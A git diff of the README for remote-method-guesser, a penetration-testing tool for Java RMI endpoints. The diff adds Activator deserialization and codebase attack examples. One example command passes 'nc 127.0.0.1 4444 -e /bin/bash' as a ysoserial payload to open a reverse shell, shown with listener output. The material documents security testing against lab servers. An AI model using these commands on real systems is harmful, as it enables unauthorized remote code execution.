@@ -64,7 +64,8 @@ the sources within the [docker folder](./.docker).
 ```console
 [qtc@kali ~]$ rmg --help
 usage: rmg [options] <ip> <port> <action>
-Identify common misconfigurations on Java RMI endpoints.
+
+rmg v3.1.0 - Identify common misconfigurations on Java RMI endpoints.
 
 Positional Arguments:
     ip                              IP address of the target
@@ -72,6 +73,7 @@ Positional Arguments:
     action                          One of the possible actions listed below
 
 Possible Actions:
+    act <gadget> <command>          Performs Activator based deserialization attacks
     bind <boundname> <listener>     Binds an object to the registry thats points to listener
     codebase <classname> <url>      Perform remote class loading attacks
     dgc <gadget> <command>          Perform DGC based deserialization attacks
@@ -88,6 +90,7 @@ Optional Arguments:
     --bound-name <name>             guess only on the specified bound name
     --config <file>                 path to a configuration file
     --create-samples                create sample classes for identified methods
+    --dgc-method <method>           method to use during dgc operations (clean|dirty)
     --follow                        follow redirects to different servers
     --force-legacy                  treat all classes as legacy stubs
     --help                          display help message
@@ -96,7 +99,7 @@ Optional Arguments:
     --no-legacy                     disable automatic legacy stub detection
     --reg-method <method>           method to use during registry operations (bind|lookup|unbind|rebind)
     --sample-folder <folder>        folder used for sample generation
-    --signature <method>            function signature for guessing or attacking
+    --signature <method>            function signature or one of (dgc|reg|act)
     --ssl                           use SSL for the rmi-registry connection
     --stack-trace                   display stack traces for caught exceptions
     --template-folder <folder>      location of the template folder
@@ -118,12 +121,8 @@ common vulnerabilities](./docs/actions#enum). ``enum`` is the default action of 
 only specifying the port and IP address of a target or by specifying ``enum`` as action explicitly.
 
 ```console
-[qtc@kali ~]$ rmg --ssl 172.23.0.2 1090
-[+] Creating RMI Registry object... done.
-[+] Obtaining list of bound names... done.
-[+] 3 names are bound to the registry.
-[+] 
-[+] Listing bound names in registry:
+[qtc@kali ~]$ rmg --ssl 172.18.0.2 1090
+[+] RMI registry bound names:
 [+] 
 [+] 	- plain-server
 [+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
@@ -142,7 +141,7 @@ only specifying the port and IP address of a target or by specifying ``enum`` as
 [+] 
 [+] RMI server String unmarshalling enumeration:
 [+] 
-[+] 	- Server attempted to deserialize object locations during lookup call.
+[+] 	- Caught MalformedURLException during lookup call.
 [+] 	  --> The type java.lang.String is unmarshalled via readObject().
 [+] 	  Configuration Status: Outdated
 [+] 
@@ -157,21 +156,26 @@ only specifying the port and IP address of a target or by specifying ``enum`` as
 [+] 	- Caught NotBoundException during unbind call (unbind was accepeted).
 [+] 	  Vulnerability Status: Vulnerable
 [+] 
-[+] RMI server DGC enumeration:
+[+] RMI DGC enumeration:
 [+] 
-[+] 	- Security Manager rejected access to the class loader (useCodebaseOnly=false).
+[+] 	- Security Manager rejected access to the class loader.
 [+] 	  --> The DGC uses most likely a separate security policy.
-[+] 	  Configuration Status: Non Default
+[+] 	  Configuration Status: Current Default
 [+] 
 [+] RMI server JEP290 enumeration:
 [+] 
 [+] 	- DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
 [+] 	  Vulnerability Status: Non Vulnerable
 [+] 
-[+] RMI server JEP290 bypass enmeration:
+[+] RMI registry JEP290 bypass enmeration:
 [+] 
 [+] 	- Caught IllegalArgumentException after sending An Trinh gadget.
 [+] 	  Vulnerability Status: Vulnerable
+[+] 
+[+] RMI ActivationSystem enumeration:
+[+] 
+[+] 	- Caught NoSuchObjectException during activate call (activator not present).
+[+] 	  Configuration Status: Current Default
 ```
 
 #### Bind Operations (bind|rebind|unbind)
@@ -322,11 +326,11 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-#### General Deserialization Attacks (reg|dgc)
+#### General Deserialization Attacks (act|reg|dgc)
 
 Apart from *remote methods* on the application level, *RMI* endpoints also expose well known *remote methods* that are needed for the internal *RMI communication*.
 Whereas modern *RMI servers* apply *deserialization filters* on these *well known remote methods* (*JEP290*), older servers may be vulnerable against *deserialization
-attacks* too. *remote-method-guesser* allows to test this by using the ``dgc`` and ``reg`` actions, that perform deserialization attacks on the *Distributed
+attacks* too. *remote-method-guesser* allows to test this by using the ``act``, ``dgc`` and ``reg`` actions, that perform deserialization attacks on the *Activator*, *Distributed
 Garbage Collector* (*DGC*) or the *RMI registry* directly. For testing purposes you can use the sufficiently outdated [example server](https://github.com/qtc-de/beanshooter/packages/398561)
 from the the [beanshooter repository](https://github.com/qtc-de/beanshooter):
 
@@ -382,15 +386,44 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
+During it's ``enum`` action, *remote-method-guesser* informs you whether an *Activator* is present on the *RMI endpoint* (legacy *RMI mechanism*).
+The default implementation for the *Activation system* does not implement any deserialization filters for the *Activator RemoteObject*. Therefore,
+deserialization attacks on an *Activator* endpoint should always work. For testing purposes, you can use ``rmid`` with a corresponding gadget
+chain within the class path:
+
+```console
+[qtc@kali ~]$ sudo cp /opt/commons-collections-3.1.jar /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext
+[qtc@kali ~]$ rmid
+
+[qtc@kali ~]$ rmg 127.0.0.1 1098 act CommonsCollections6 "nc 127.0.0.1 4444 -e /bin/bash"
+[+] Creating ysoserial payload... done.
+[+]
+[+] Attempting deserialization attack on Activation endpoint...
+[+]
+[+] 	Caught IllegalArgumentException during deserialization attack.
+[+] 	Deserialization attack was probably successful :)
+
+[qtc@kali ~]$ nc -vlp 4444
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 127.0.0.1.
+Ncat: Connection from 127.0.0.1:34210.
+id
+uid=1004(qtc) gid=1004(qtc) groups=1004(qtc)
+```
+
+
 #### Codebase Attacks (codebase)
 
 *Java RMI* supports a feature called *codebases*, where the client and the server can specify *URLs* during *RMI calls* that
 may be used to load unknown classes dynamically. If an *RMI server* accepts *client specified codebases*, this can lead to
 *remote code execution* by providing malicious *Java* classes during the *RMI communication*.
 
-The codebase configuration on an *RMI server* can be different for the three different components: *DGC*, *Registry* and *Application Level*.
+The codebase configuration on an *RMI server* can be different for the different components: *Activator*, *DGC*, *Registry* and *Application Level*.
 *remote-method-guesser* allows you to test each component individually by using either ``--signature <method>`` (application level),
-``--signature reg`` (rmi registry) or ``--signature dgc`` (distributed garbage collector) together with the ``codebase`` action.
+``--signature act`` (activator), ``--signature dgc`` (distributed garbage collector) or ``--signature reg`` (rmi registry) together with the
+``codebase`` action.
 
 **Application Level**
 
@@ -434,6 +467,18 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 [qtc@kali www]$ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 172.23.0.2 - - [13/Jan/2021 07:48:31] "GET /Example.class HTTP/1.1" 200 -
+```
+
+**Activator**
+
+```console
+[qtc@kali ~]$ rmg 127.0.0.1 1098 codebase Example 127.0.0.1:8000 --signature act
+[+] Attempting codebase attack on Activator endpoint...
+[+] Using class Example with codebase http://127.0.0.1:8000/ during activate call.
+
+[qtc@kali www]$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+127.0.0.1 - - [29/Jan/2021 06:59:43] "GET /Example.class HTTP/1.1" 200 -
 ```
 
 
